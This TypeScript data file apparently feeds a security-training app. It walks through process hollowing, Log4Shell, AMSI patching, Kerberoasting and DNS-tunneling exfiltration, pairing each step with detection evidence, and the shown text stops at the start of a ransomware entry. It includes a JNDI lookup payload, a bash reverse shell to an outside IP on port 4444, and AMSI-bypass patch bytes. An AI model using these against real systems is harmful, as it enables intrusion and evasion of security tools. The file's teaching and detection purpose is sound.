import { RawScenarioStepGuideData } from '../scenario-step-guides';

export const CORE_AND_PALOALTO_STEP_GUIDES: Record<string, RawScenarioStepGuideData> = {
  'process-hollowing': {
    scenarioId: 'process-hollowing',
    briefing: {
      headline: 'Scenario Briefing: Process Hollowing (MITRE T1055.012) — Running Malware Inside a Trusted Windows Process',
      storyAnalogy:
        'Imagine an intruder who wants to enter a high-security bank without raising an alarm. Instead of breaking down the front door in a ski mask, they hire an official armored bank truck, freeze it inside the garage before the driver even starts the route, empty out all the legal bank cargo inside, load their own covert crew into the back of that exact armored truck, and release the brake. Every security camera and guard at the gate still sees the bank’s own trusted license plate and uniform.',
      plainSummary:
        'In this scenario (MITRE ATT&CK T1055.012), the attacker wants to run malicious code on a Windows workstation (10.20.4.18) without triggering antivirus or application-allowlisting rules. Instead of launching an unknown .exe file directly, the dropper (dropper.exe, PID 4812) creates a genuine Windows system process—svchost.exe (PID 9104)—in a paused state (CREATE_SUSPENDED), hollows out its legitimate memory pages, writes the malicious PE payload into that empty space, repoints the CPU registers to the new entry point, and resumes the thread so the malware runs disguised as svchost.exe.',
      diagramTopologySummary:
        'On the diagram: Start at Node ③ (Win11 Workstation 10.20.4.18 / dropper.exe PID 4812) and Node ④ (Hollowed svchost.exe PID 9104), follow the 5 memory-manipulation stages inside the host, and watch the final outbound C2 beacon travel through Node ② (Firewall) to Node ①/⑤ (Attacker C2 198.51.100.77:443) while Node ⑥ (SIEM) captures the forensic trail.',
      documentedAdvisory: 'MITRE ATT&CK T1055.012 · Sysmon v15 EventID 1 / 8 / 10 / 25 · Elastic Detection Rules',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1055.012',
        plainTitle: 'Launching a Legitimate Windows Process in a Paused ("Suspended") State',
        storyAnalogy:
          'Think of a stage director calling a famous, badge-carrying security guard onto the stage, but pressing the "Freeze" button the millisecond the guard steps through the door—before the guard can take a single step or read their official script.',
        simpleExplanation:
          'The attacker’s loader (dropper.exe, PID 4812) asks Windows to start a real system program: C:\\Windows\\System32\\svchost.exe (PID 9104). However, it passes a special flag (CREATE_SUSPENDED = 0x00000004) so the new svchost.exe process is frozen at the starting line before its first instruction can run.',
        howItWorksInPractice:
          'When CreateProcessW is called with CREATE_SUSPENDED, the Windows kernel creates the process container, loads ntdll.dll, and sets up the primary thread (TID 9108), but holds the thread in a waiting state so the parent process can modify its memory first.',
        diagramAlignment:
          'On the diagram, look at arrow #1.1→ from Node ③ (Win11 Workstation / dropper.exe PID 4812) to Node ④ (svchost.exe PID 9104), and return arrow ⇠#1.2 returning the valid process handle (hProcess = 0x01C4).',
        detectionAndEvidence:
          'Documented in Sysmon EventID 1 (ProcessCreate): ParentImage C:\\Users\\Public\\dropper.exe spawning C:\\Windows\\System32\\svchost.exe instead of the standard Windows service controller (services.exe).',
      },
      {
        stepNumber: 2,
        mitreId: 'T1055.012',
        plainTitle: 'Hollowing Out ("Unmapping") the Original svchost.exe Code From Memory',
        storyAnalogy:
          'While the official armored truck is still frozen in the garage, the crew opens the back doors and removes every single crate of genuine bank cargo, leaving a completely hollow shell that still carries the official license plate on the outside.',
        simpleExplanation:
          'Now that svchost.exe (PID 9104) is paused, dropper.exe reads its Process Environment Block (PEB) to find where the real svchost.exe code lives in memory (ImageBaseAddress = 0x00007FF7A1200000), and calls NtUnmapViewOfSection to strip that legitimate code out of RAM.',
        howItWorksInPractice:
          'NtUnmapViewOfSection tells the Windows Virtual Memory Manager to release the memory section mapped from C:\\Windows\\System32\\svchost.exe on disk, leaving an empty "hollow" process shell that still looks like svchost.exe to basic task managers.',
        diagramAlignment:
          'On the diagram, follow arrow #2.1→ between Node ③ and Node ④ (NtUnmapViewOfSection @ 0x7FF7A1200000), and return arrow ⇠#2.2 confirming NTSTATUS 0x00000000 (STATUS_SUCCESS).',
        detectionAndEvidence:
          'Documented in Sysmon EventID 10 (ProcessAccess) & EventID 25 (ProcessTampering): GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) on svchost.exe followed by image unmapping.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1055.012',
        plainTitle: 'Allocating Writable-Executable (RWX) Memory & Injecting the Malicious PE Image',
        storyAnalogy:
          'Into that emptied-out armored truck, the intruder loads their own hidden gear and rewrites the route manual inside the cab—keeping the exterior paint job untouched so nobody outside notices the swap.',
        simpleExplanation:
          'Next, dropper.exe reserves a fresh 0x38000-byte block of memory at that exact same address (0x7FF7A1200000) inside svchost.exe using VirtualAllocEx with Read-Write-Execute (PAGE_EXECUTE_READWRITE = 0x40) permissions, and uses WriteProcessMemory to copy the malicious PE headers ("MZ") and code sections into it.',
        howItWorksInPractice:
          'A legitimate program loaded by Windows has separate memory permissions per section (.text is Read-Execute, .data is Read-Write). Allocating a private memory region with simultaneous Read, Write, and Execute (RWX) permissions and an "MZ" header inside another process is a classic forensic indicator of code injection.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ shows Node ③ writing the 224 KB PE image into Node ④ (svchost.exe @ 0x7FF7A1200000), and return arrow ⇠#3.2 confirms BytesWritten = 0x38000.',
        detectionAndEvidence:
          'Documented in Windows Defender / ETW Threat-Intelligence (EtwTiLogAllocVMRemote) & Sysmon EventID 25: unbacked private RWX memory region containing a PE header (4D 5A 90 00).',
      },
      {
        stepNumber: 4,
        mitreId: 'T1055.012',
        plainTitle: 'Hijacking the CPU Thread Context & Resuming Execution',
        storyAnalogy:
          'Before pressing "Unfreeze", the intruder turns the driver’s steering wheel and GPS toward their own secret destination (0x7FF7A12014E0). The moment the freeze button is released, the truck drives straight toward the attacker’s objective.',
        simpleExplanation:
          'The malicious code is now sitting inside svchost.exe, but the paused thread (TID 9108) is still pointing at the old startup address. The loader calls SetThreadContext to point the CPU’s RCX register to the new malicious entry point (0x00007FF7A12014E0), and then calls ResumeThread to unpause svchost.exe.',
        howItWorksInPractice:
          'On 64-bit Windows, before a newly created thread runs its user-mode entry point (RtlUserThreadStart), the address of the executable’s entry point is stored in the RCX register. Overwriting RCX redirects execution to the injected payload the instant ResumeThread decrements the suspend count to 0.',
        diagramAlignment:
          'On the diagram, arrow #4.1→ updates the thread context and resumes TID 9108 inside Node ④, with ⇠#4.2 returning SuspendCount = 1 → 0.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 8 / 25 (ProcessTampering — "Image is replaced"): the in-memory code executing at 0x7FF7A12014E0 no longer matches the signed svchost.exe binary on disk.',
      },
      {
        stepNumber: 5,
        mitreId: 'T1071.001',
        plainTitle: 'Outbound HTTPS Command-and-Control (C2) Beacon From the Hollowed Process',
        storyAnalogy:
          'The disguised armored truck now drives right past the perimeter gate guard (the firewall) to make a drop-off at an outside warehouse. The guard lets it pass because the truck’s badge says svchost.exe—until the central security room checks the GPS log and realizes that specific truck was never scheduled to leave the building.',
        simpleExplanation:
          'Now running as svchost.exe (PID 9104), the injected payload opens an encrypted TLS 1.3 HTTPS connection over port 443 to the external Command-and-Control server at 198.51.100.77 (cdn- telemetry-update.com) to await operator commands.',
        howItWorksInPractice:
          'Host firewalls often trust C:\\Windows\\System32\\svchost.exe to make outbound connections. However, a genuine svchost.exe always runs with a "-k <ServiceGroup>" command-line argument and is spawned by services.exe—so a bare svchost.exe making external TLS connections is immediately flagged by SIEM correlation.',
        diagramAlignment:
          'On the diagram, arrow #5.1→ travels from Node ④ (Hollowed svchost.exe) through Node ② (Firewall) to Node ①/⑤ (Attacker C2 198.51.100.77:443), while Node ⑥ (SIEM) correlates the alert.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 3 (NetworkConnect) & Suricata TLS JA3 72a589da586844d7f0818ce684948eea: svchost.exe (PID 9104) connecting to 198.51.100.77:443.',
      },
    ],
  },

  'log4shell-dfir': {
    scenarioId: 'log4shell-dfir',
    briefing: {
      headline: 'Scenario Briefing: Log4Shell (CVE-2021-44228) — From a Single HTTP Log Line to Remote Code Execution',
      storyAnalogy:
        'Imagine a building receptionist whose job is simply to write down every visitor’s name in a paper guestbook. One visitor walks up and says: "My name is ${Call-External-Courier-And-Run-His-Package}". Instead of writing that strange sentence down as plain ink on paper, the overly helpful receptionist actually picks up the phone, dials the outside courier, accepts a package from him, and executes its instructions inside the building.',
      plainSummary:
        'In this scenario (CISA Advisory AA21-356A / CVE-2021-44228), an attacker compromises a Java web server simply by sending a specially crafted text string—${jndi:ldap://198.51.100.44:1389/Exploit}—inside an HTTP request header. When the Java application logs that header using vulnerable Apache Log4j2 (v2.14.1), Log4j’s message lookup feature interprets the "${jndi:...}" string as an active command, reaches out to the attacker’s rogue LDAP and HTTP servers, downloads a compiled Java class (Exploit.class), and executes an interactive shell inside the server.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (Attacker / Rogue LDAP & HTTP Server 198.51.100.44), follow the HTTP request through Node ② (DMZ Reverse Proxy) into Node ③ (Java Web Server) and Node ④ (Vulnerable Log4j2 JVM Engine), and trace the outbound callback and shell to Node ⑤/⑥ (SIEM Detection).',
      documentedAdvisory: 'CISA Alert AA21-356A · NIST NVD CVE-2021-44228 · MITRE ATT&CK T1190 / T1059.004',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Sending the "${jndi:ldap://...}" String Inside an HTTP Header',
        storyAnalogy:
          'The intruder walks up to the front reception desk and hands over a visitor badge whose "Browser Name" field contains a secret phone-call instruction instead of a normal browser name.',
        simpleExplanation:
          'The attacker sends a standard HTTPS GET request to /api/v1/login on the public web server, but replaces the normal User-Agent header with a Log4j lookup expression: ${jndi:ldap://198.51.100.44:1389/Basic/Command/Base64/...}.',
        howItWorksInPractice:
          'Web applications routinely log HTTP headers like User-Agent or X-Forwarded-For for troubleshooting and analytics. The attacker knows that as soon as the Java server calls logger.info() on that header, Log4j2 will parse any "${...}" expression it finds inside the string.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ① (Attacker 198.51.100.44) through Node ② (Reverse Proxy) to Node ③ (Java Web Server :8080), and return arrow ⇠#1.2 as the request enters the Log4j logger.',
        detectionAndEvidence:
          'Documented in CISA AA21-356A & ModSecurity CRS Rule 944150: HTTP header or URI parameters containing "${jndi:" (or obfuscated variants like "${lower:j}ndi:").',
      },
      {
        stepNumber: 2,
        mitreId: 'T1190',
        plainTitle: 'Log4j Evaluates the Lookup & Connects Out to the Attacker’s Rogue LDAP Server',
        storyAnalogy:
          'As the receptionist writes the visitor’s name into the guestbook, they read the "${jndi:ldap://...}" instruction out loud, pick up the office telephone, and dial the intruder’s external directory number (port 1389) to ask what to do next.',
        simpleExplanation:
          'Instead of writing the text literally to disk, Log4j’s MessagePatternConverter hands the string to Java Naming and Directory Interface (JNDI). The Java server immediately opens an outbound TCP connection on port 1389 to the attacker’s LDAP server (198.51.100.44) asking for the directory object.',
        howItWorksInPractice:
          'JNDI was designed so Java enterprise apps could look up shared configuration objects over a corporate directory (LDAP/RMI). Because Log4j2 v2.0–2.14.1 recursively evaluated lookups inside log messages by default, untrusted user input could force the JVM to query any external LDAP server.',
        diagramAlignment:
          'On the diagram, follow arrow #2.1→ from Node ④ (Log4j2 JNDI Engine inside the Java Server) back out to Node ①/⑤ (Rogue LDAP Server 198.51.100.44:1389), and return arrow ⇠#2.2 delivering the LDAP Referral response.',
        detectionAndEvidence:
          'Documented in Zeek/Suricata SID 2034650: internal Java server initiating unexpected outbound LDAP (TCP/1389 or TCP/389) connections to an external IP address.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1105',
        plainTitle: 'LDAP Referral & Downloading Remote "Exploit.class" Bytecode Over HTTP',
        storyAnalogy:
          'The voice on the other end of the phone says: "I don’t keep the package here, go download the blueprint from my web locker on port 8888 (`javaCodeBase`)." The Java server obediently fetches that blueprint and loads it directly into memory.',
        simpleExplanation:
          'The attacker’s LDAP reply returns a JNDI Naming Reference pointing the Java server to a second URL—`http://185.220.101.42:8888/Exploit.class`—via the `javaCodeBase` and `javaFactory` attributes. The JVM downloads `Exploit.class` (1.4 KB) over HTTP and loads the bytecode into memory using `URLClassLoader`.',
        howItWorksInPractice:
          'When an LDAP directory response includes `javaClassName`, `javaCodeBase`, and `javaFactory`, Java’s `NamingManager` automatically fetches the external `.class` bytecode from the remote HTTP server and instantiates the object to resolve the lookup.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ fetches `GET /Exploit.class` from Node ① (Attacker HTTP Server `:8888`) into Node ④ (Java JVM Process `URLClassLoader`).',
        detectionAndEvidence:
          'Documented in Zeek `http.log` & Suricata: Java process downloading compiled `.class` bytecode (`CAFEBABE` magic header) from an external IP.',
      },
      {
        stepNumber: 4,
        mitreId: 'T1059.004',
        plainTitle: 'Executing the Static Initializer & Spawning a "/bin/bash" Reverse Shell',
        storyAnalogy:
          'The moment the blueprint finishes loading on the receptionist’s desk, a spring-loaded mechanism inside its cover (`static {}` block) snaps open and dials a permanent private backdoor phone line (`/bin/bash -i`) straight back to the intruder on port 4444.',
        simpleExplanation:
          'As soon as the JVM instantiates `Exploit.class`, its `static {}` initializer block runs `Runtime.getRuntime().exec()`, causing `/usr/bin/java` (PID 1842) to spawn `/bin/bash -c "bash -i >& /dev/tcp/185.220.101.42/4444 0>&1"` (PID 2910) under the `tomcat` user.',
        howItWorksInPractice:
          'In Java, a class’s `static {}` block executes automatically the instant the class is initialized by the ClassLoader—allowing the attacker to run arbitrary OS commands without needing the application to call any method on the returned object.',
        diagramAlignment:
          'On the diagram, arrow #4.1→ spawns `/bin/bash` (PID 2910) from Node ④ (Java JVM Process) and connects out to Node ① (`185.220.101.42:4444`), while Node ⑤/⑥ (SIEM / Auditd) captures the child shell process.',
        detectionAndEvidence:
          'Documented in Linux Auditd (`SYSCALL execve`) & Sysmon for Linux EventID 1: ParentProcess `/usr/bin/java` spawning child process `/bin/bash` or `/bin/sh` with `/dev/tcp/` redirection.',
      },
    ],
  },

  'amsi-reflective-dll': {
    scenarioId: 'amsi-reflective-dll',
    briefing: {
      headline: 'Scenario Briefing: In-Memory AMSI Patching & Reflective DLL Injection (MITRE T1562.001 / T1620)',
      storyAnalogy:
        'Imagine a burglar inside a jewelry store where every bag is inspected by an X-ray scanner at the counter (AMSI). Before pulling any tools out of their coat, the burglar reaches into the X-ray machine’s display wire inside their own room and solders a tiny jumper so the screen permanently flashes "BAG IS CLEAN". With the scanner blinded, they assemble their custom lockpick right in their hands without ever setting a tool down on the floor (the hard drive).',
      plainSummary:
        'Normally, when PowerShell runs a script or loads a .NET assembly, Windows Antimalware Scan Interface (AMSI) hands the unencrypted buffer to the endpoint’s antivirus engine before letting it run. In this scenario (MITRE T1562.001 & T1620), the attacker first blinds AMSI inside their own PowerShell process (PID 6320) by overwriting the first 6 bytes of AmsiScanBuffer() in amsi.dll so it always returns "clean". With AMSI silenced inside that process, PowerShell loads a C2 agent DLL directly from a byte array in RAM without ever touching the hard drive.',
      diagramTopologySummary:
        'On the diagram: Start at Node ③ (Workstation 10.20.4.31 / powershell.exe PID 6320) and Node ④ (In-Memory amsi.dll & Reflective Loader), trace the 3 memory-patching and reflective-loading steps, and follow the final HTTPS beacon to Node ①/⑤ (C2 Server) monitored by Node ⑥ (EDR / SIEM).',
      documentedAdvisory: 'MITRE ATT&CK T1562.001 & T1620 · Microsoft Defender EtwTiLogProtectVM · Sysmon EventID 7 / 19',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1562.001',
        plainTitle: 'Locating amsi.dll in PowerShell’s Memory & Making AmsiScanBuffer Writable',
        storyAnalogy:
          'The intruder locates the exact inspection box (amsi.dll) mounted inside their room and unlocks its metal protective cover (changing memory protection from Read-Execute to Read-Write-Execute) so the internal wiring can be altered.',
        simpleExplanation:
          'Every PowerShell process automatically loads C:\\Windows\\System32\\amsi.dll into its own user-mode memory space. The attacker’s script calls GetProcAddress to find the exact memory address of the AmsiScanBuffer function, and calls VirtualProtect to change that 4 KB memory page from Read-Execute (0x20) to Read-Write-Execute (0x40).',
        howItWorksInPractice:
          'Because amsi.dll runs inside the same user-mode process space (Ring 3) as the PowerShell script it is supposed to inspect, any code running inside PowerShell has permission to modify amsi.dll’s in-memory code pages once VirtualProtect makes them writable.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ shows Node ③ (powershell.exe PID 6320) invoking VirtualProtect on Node ④ (amsi.dll!AmsiScanBuffer), and return arrow ⇠#1.2 returns OldProtect = 0x20 (PAGE_EXECUTE_READ).',
        detectionAndEvidence:
          'Documented in Microsoft-Windows-Threat-Intelligence ETW (EtwTiLogProtectVM) & PowerShell EventID 4104: VirtualProtect changing code pages of amsi.dll to PAGE_EXECUTE_READWRITE.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1562.001',
        plainTitle: 'Overwriting 6 Bytes of AmsiScanBuffer So Every Scan Immediately Returns "Clean"',
        storyAnalogy:
          'With the inspection cover open, the intruder replaces the scanner’s sensor circuit with a 6-byte shortcut that immediately stamps "E_INVALIDARG / CLEAN" and exits before the camera even turns on.',
        simpleExplanation:
          'With the memory page unlocked, the script writes a 6-byte x64 machine-code stub (B8 57 00 07 80 C3 -> mov eax, 0x80070057; ret) directly over the start of AmsiScanBuffer(). From this moment on, whenever PowerShell asks AMSI to scan a script, AmsiScanBuffer immediately exits with HRESULT 0x80070057 (E_INVALIDARG) before inspecting a single byte.',
        howItWorksInPractice:
          'When AmsiScanBuffer returns an error code like E_INVALIDARG without setting the result to AMSI_RESULT_DETECTED, the calling scripting host treats the scan as non-blocking and proceeds to execute the script buffer.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ writes the 6-byte patch into Node ④ (amsi.dll!AmsiScanBuffer +0x00), and return arrow ⇠#2.2 returns 0x80070057 (AMSI_RESULT_CLEAN bypass).',
        detectionAndEvidence:
          'Documented by Defender ATP / Elastic Endgame memory integrity scans: the in-memory prologue of amsi.dll!AmsiScanBuffer differs from the clean amsi.dll image on disk.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1620',
        plainTitle: 'Reflectively Loading a .NET / PE Agent Directly From a Byte Array in RAM',
        storyAnalogy:
          'Now that the room’s X-ray scanner is blind, the intruder unfolds a complete communication radio directly out of a memorized blueprint in their head (`[Reflection.Assembly]::Load`), never placing a single file onto the floor where a floor sensor could spot it.',
        simpleExplanation:
          'Now that AMSI is blinded inside PID 6320, the attacker calls [System.Reflection.Assembly]::Load([byte[]]$buf) to load a compiled C2 agent DLL directly from a Base64 byte array in memory—without ever writing a .dll file to the C: drive.',
        howItWorksInPractice:
          'Reflective loading parses the PE/COFF headers and maps the assembly into the process’s CLR application domain purely in volatile RAM, bypassing traditional file-system antivirus triggers that only watch disk writes.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ loads the reflective DLL inside Node ④ and opens the C2 channel toward Node ①/⑤, while Node ⑥ (SIEM / DotNet Runtime ETW) logs the unbacked assembly load.',
        detectionAndEvidence:
          'Documented in Microsoft-Windows-DotNETRuntime ETW (AssemblyLoadVerbose_V1) & Sysmon EventID 7: CLR assembly loaded from memory with an empty ModuleILPath (no backing file on disk).',
      },
    ],
  },

  'ad-kerberoasting': {
    scenarioId: 'ad-kerberoasting',
    briefing: {
      headline: 'Scenario Briefing: Active Directory Kerberoasting (MITRE T1558.003) — Requesting Service Tickets to Crack Offline',
      storyAnalogy:
        'Imagine a theme park where any visitor with a basic entry wristband is allowed to walk up to the ticket booth and ask for a sealed VIP voucher to the SQL Rollercoaster. The booth seals that voucher using the rollercoaster manager’s secret password. Instead of riding the coaster, the attacker takes the sealed voucher home to their basement and tries millions of passwords per second until the seal pops open—without a single guard at the park knowing they are guessing.',
      plainSummary:
        'In Windows Active Directory, any standard domain user is allowed to ask the Domain Controller (KDC) for a Kerberos Service Ticket (TGS) to connect to any service registered with a Service Principal Name (SPN), such as a Microsoft SQL Server. Because the Domain Controller encrypts that ticket using the password hash of the service account that runs SQL Server, an attacker (MITRE T1558.003) can request the ticket legitimately, export it from memory, and brute-force the service account’s password offline on a GPU rig—without triggering any failed-login alerts on the Domain Controller.',
      diagramTopologySummary:
        'On the diagram: Start at Node ①/③ (Compromised Domain Workstation 10.20.4.55), query SPNs and request a RC4 TGS ticket from Node ④ (Active Directory KDC / DC01 10.20.1.10:88), crack the hash offline, and authenticate as the privileged SQLAdmin account to Node ⑤ (SQL Server), monitored by Node ⑥ (SIEM EventID 4769).',
      documentedAdvisory: 'MITRE ATT&CK T1558.003 · Microsoft Security EventID 4769 · CISA / NSA Active Directory Hardening Guide',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1558.003',
        plainTitle: 'Querying Active Directory LDAP to Find Accounts With Service Principal Names (SPNs)',
        storyAnalogy:
          'The visitor opens the park’s public phonebook (LDAP) and searches for every attraction that uses a human manager’s personal account instead of an automated machine lock.',
        simpleExplanation:
          'From a domain-joined workstation (10.20.4.55) using a regular low-privilege domain user account, the attacker sends an LDAP query to the Domain Controller (DC01, port 389) searching for user accounts (`samAccountType=805306368`) that have a non-empty `servicePrincipalName` attribute—discovering `MSSQLSvc/sql01.corp.local:1433` owned by `svc_sqladmin`.',
        howItWorksInPractice:
          'Every domain user has read access to Active Directory LDAP by default so computers can locate network services. Human-created service accounts (like `svc_sqladmin`) are prime targets because their passwords are often set once by an administrator and rarely rotated, unlike automatic computer accounts.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ③ (Domain Workstation) to Node ④ (Active Directory DC01 :389 LDAP), and return arrow ⇠#1.2 returning the SPN record `MSSQLSvc/sql01.corp.local:1433`.',
        detectionAndEvidence:
          'Documented in Microsoft Defender for Identity & LDAP ETW: LDAP search filter `(&(samAccountType=805306368)(servicePrincipalName=*))` enumerating all user-bound SPNs.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1558.003',
        plainTitle: 'Requesting a Kerberos Service Ticket (KRB_TGS_REQ) With Downgraded RC4 Encryption',
        storyAnalogy:
          'The visitor walks up to the central ticket booth (KDC port 88) and requests a voucher for the SQL attraction, specifically asking the clerk to seal it with an older, faster-to-crack wax stamp (`0x17 RC4-HMAC`) instead of modern armor (`AES-256`).',
        simpleExplanation:
          'Using their valid Kerberos Ticket-Granting Ticket (TGT), the attacker asks the Domain Controller’s Key Distribution Center (KDC, port 88) for a Service Ticket (`KRB_TGS_REQ`) to `MSSQLSvc/sql01.corp.local:1433`, specifically requesting encryption type `0x17` (RC4-HMAC) instead of AES-256.',
        howItWorksInPractice:
          'The KDC does not check whether the user actually has permission to log into the SQL database—that check is left to the SQL server itself. The KDC simply encrypts the `KRB_TGS_REP` ticket using the NTLM hash of `svc_sqladmin` and hands it back to the user.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ sends `KRB_TGS_REQ (SPN: MSSQLSvc/sql01.corp.local:1433, etype=0x17)` to Node ④ (KDC :88), and ⇠#2.2 returns the RC4-encrypted `KRB_TGS_REP` ticket.',
        detectionAndEvidence:
          'Documented in Windows Security EventID 4769 (A Kerberos service ticket was requested): `TicketEncryptionType = 0x17` (RC4-HMAC) and `TicketOptions = 0x40810000` when modern domain machines normally use `0x12` (AES256).',
      },
      {
        stepNumber: 3,
        mitreId: 'T1110.002',
        plainTitle: 'Cracking the Service Ticket Offline & Logging In With the Recovered Password',
        storyAnalogy:
          'Back in their private workshop, the attacker tests millions of candidate passwords per second against the sealed voucher (`$krb5tgs$23$*`) until the seal opens—revealing the SQL manager’s real plaintext password without ever triggering a single failed-login alarm at the park.',
        simpleExplanation:
          'The attacker exports the `KRB_TGS_REP` cipher blob from memory in `$krb5tgs$23$*` format and runs Hashcat (`-m 13100`) offline on an external GPU rig. Because the cracking happens completely offline against the downloaded ticket, zero failed login events occur on the Domain Controller. Once the plaintext password of `svc_sqladmin` is recovered, the attacker logs directly into the production SQL Server (Node ⑤).',
        howItWorksInPractice:
          'RC4-HMAC (`etype 23`) uses the raw MD4/NTLM hash of the service account’s password as the encryption key without salting, allowing modern GPUs to test billions of candidate passwords per second.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ shows the attacker cracking the ticket offline and authenticating with `svc_sqladmin` to Node ⑤ (SQL Server :1433) while Node ⑥ (SIEM) correlates EventID 4769 with the subsequent privileged login (EventID 4624).',
        detectionAndEvidence:
          'Documented in Windows Security EventID 4769 followed by EventID 4624 (Logon Type 3) for `svc_sqladmin` from an unusual workstation IP.',
      },
    ],
  },

  'dns-tunneling-exfil': {
    scenarioId: 'dns-tunneling-exfil',
    briefing: {
      headline: 'Scenario Briefing: DNS Tunneling & Data Exfiltration (MITRE T1071.004 / T1048.003)',
      storyAnalogy:
        'Imagine a locked-down prison facility where inmates are forbidden from mailing letters or making outside phone calls, but they are allowed to ask the prison operator: "What is the phone number for [Company Name]?" The operator is required to call the outside directory to check. So the inmate asks: "What is the phone number for `Secret-Blueprint-Page1-4a6f686e.evil-c2.net`?" The prison operator faithfully reads that exact secret message out loud to the accomplice waiting at the `evil-c2.net` directory desk.',
      plainSummary:
        'Even in tightly locked-down networks where employees cannot browse external websites directly, internal computers still need to resolve domain names (DNS) through an internal corporate DNS resolver. In this scenario (MITRE T1071.004 & T1048.003), the attacker abuses that DNS chain: instead of connecting directly to their server, the malware on the victim workstation chops stolen database records into small Base32/Hex chunks, disguises each chunk as a subdomain label (`<chunk>.exfil.c2-auth-dns.net`), and asks the corporate DNS server to look it up—forcing the corporate DNS server itself to deliver the stolen data to the attacker’s authoritative nameserver.',
      diagramTopologySummary:
        'On the diagram: Start at Node ③/④ (Compromised Host 10.20.4.18 & DNS Tunnel Agent), follow the recursive UDP/53 queries through Node ② (Internal Corporate DNS Resolver 10.20.1.53) out to Node ①/⑤ (Attacker Authoritative Nameserver `ns1.c2-auth-dns.net`), while Node ⑥ (SIEM / Zeek DNS Analyzer) flags the high-entropy subdomains.',
      documentedAdvisory: 'MITRE ATT&CK T1071.004 & T1048.003 · SANS DNS Tunneling Detection · Sysmon EventID 22 / Zeek dns.log',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1560',
        plainTitle: 'Compressing, Encrypting, and Slicing Stolen Data Into DNS-Safe Base32 Labels',
        storyAnalogy:
          'Before speaking to the prison operator, the inmate shreds the stolen blueprint into 56-character strips and encodes every strip using only letters and numbers that sound like a valid company name.',
        simpleExplanation:
          'Before sending any network traffic, the malware on the workstation reads the sensitive credential file, compresses and AES-encrypts it, and encodes the binary bytes into Base32 strings split into 56-character chunks (`4a6f686e446f65...`) so every chunk is a legal DNS hostname label under the 63-character RFC 1035 limit.',
        howItWorksInPractice:
          'Standard DNS labels only allow letters, digits, and hyphens (up to 63 bytes per dot-separated label, 253 bytes total). Encoding raw ciphertext into Base32 or Hex guarantees that corporate DNS resolvers will forward the query without syntax errors.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ③ (Victim Workstation) into Node ④ (DNS Exfil Chunker Process), and return arrow ⇠#1.2 producing the sequence of numbered Base32 subdomain queries.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 22 (DnsQuery): non-browser background process generating hundreds of unique, long, high-entropy (>4.1 bits/char) subdomain lookups under the same parent domain.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1071.004',
        plainTitle: 'Relaying Subdomain Queries Through the Corporate DNS Resolver (UDP Port 53)',
        storyAnalogy:
          'The inmate hands each encoded question to the trusted internal prison operator (Corporate DNS `10.20.1.53`), who sees that they don’t have that company cached in their local binder and automatically calls the outside internet to find out.',
        simpleExplanation:
          'The malware sends standard UDP port 53 DNS `TXT` / `A` queries for `<seq>.<base32_chunk>.c2-auth-dns.net` to the company’s own internal DNS server (`10.20.1.53`). Because those unique subdomains are never in the cache, the corporate DNS server automatically forwards the query out through the firewall to the attacker’s authoritative nameserver.',
        howItWorksInPractice:
          'The compromised workstation never touches the internet directly—its packets only go to `10.20.1.53:53` on the internal LAN. The attacker relies on standard recursive DNS resolution to carry the subdomain payload across the firewall boundary.',
        diagramAlignment:
          'On the diagram, follow arrow #2.1→ from Node ④ through Node ② (Corporate DNS Resolver 10.20.1.53:53), and return arrow ⇠#2.2 as the resolver forwards and returns the recursive lookup.',
        detectionAndEvidence:
          'Documented in Zeek `dns.log` & Corelight DNS Analytics: zero cache-hit ratio (`100% unique FQDNs`) and abnormal query-length distribution (>110 chars per query) to a single registered domain.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1048.003',
        plainTitle: 'Reassembling the File at the Attacker’s Nameserver & Sending Commands Back in TXT Records',
        storyAnalogy:
          'The accomplice sitting at the `c2-auth-dns.net` phone desk writes down every company name the prison operator asks about, glues the strips back into the stolen file, and replies with a fake phone number (`TXT` record) that secretly tells the inmate to send the next page.',
        simpleExplanation:
          'When the query arrives at the attacker’s authoritative nameserver (`ns1.c2-auth-dns.net`), the attacker’s server strips the `.c2-auth-dns.net` suffix, Base32-decodes the subdomain labels, reassembles the stolen file in sequence order, and replies with a DNS `TXT` record (`"v=ack;seq=042;cmd=noop"`) that travels all the way back to the malware as the "answer".',
        howItWorksInPractice:
          'This creates a full two-way covert channel over UDP/53: outbound data rides inside the DNS Query Name (`QNAME`), and inbound C2 commands or acknowledgments ride back inside the DNS `TXT` or `CNAME` response payload.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ delivers the recursive query to Node ①/⑤ (Attacker Authoritative DNS `198.51.100.53:53`) and returns `⇠#3.2 TXT ACK`, while Node ⑥ (SIEM) triggers the DNS Exfiltration alert.',
        detectionAndEvidence:
          'Documented in Suricata & Splunk Enterprise Security: sustained volume of DNS TXT responses from a newly registered domain combined with Shannon entropy > 4.2 on subdomain labels.',
      },
    ],
  },

  'ransomware-shadow-wipe': {
    scenarioId: 'ransomware-shadow-wipe',
    briefing: {
      headline: 'Scenario Briefing: Ransomware Pre-Encryption — Wiping Volume Shadow Copies (MITRE T1490 / T1486)',
      storyAnalogy:
